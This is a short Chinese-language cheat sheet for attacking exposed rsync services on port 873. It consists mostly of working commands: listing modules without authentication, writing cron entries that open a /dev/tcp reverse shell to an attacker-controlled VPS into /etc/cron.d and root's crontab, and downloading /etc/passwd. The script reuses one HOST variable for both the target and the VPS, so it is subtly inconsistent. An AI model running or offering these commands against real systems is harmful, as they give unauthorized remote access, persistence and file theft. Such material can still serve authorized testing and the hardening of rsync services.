# 873 Rsync

## Rsync 未授权访问

如果 rsync 服务存在未授权访问，可以直接使用 rsync 命令进行连接。

```bash
HOST=; PORT=873; # TARGET HOST INFO
```

```bash
rsync rsync://$HOST:$PORT/
```

## Rsync 文件上传

如果 rsync 服务存在未授权访问，可以通过写入计时任务获取目标主机操作权限或下载服务器文件，也可以通过控制下发的内容，影响接收文件的主机。

```bash
HOST=; PORT=873; # TARGET HOST INFO
```

```bash
# 上传本地计时任务反弹 Shell

HOST=;PORT=6789; # VPS INFO

# 系统级计划任务
echo "* * * * * root /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1" > reverse_shell
rsync -av reverse_shell rsync://$HOST:$PORT/src/etc/cron.d/reverse_shell

# 用户级计划任务
echo "* * * * * /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1" > reverse_shell_root
rsync -av reverse_shell_root rsync://$HOST:$PORT/src/etc/cron.d/var/spool/cron/root
```

## Rsync 文件下载

```bash
HOST=; PORT=873; # TARGET HOST INFO
```

```bash
rsync -av rsync://$HOST:$PORT/src/etc/passwd ./passwd.downloaded
```
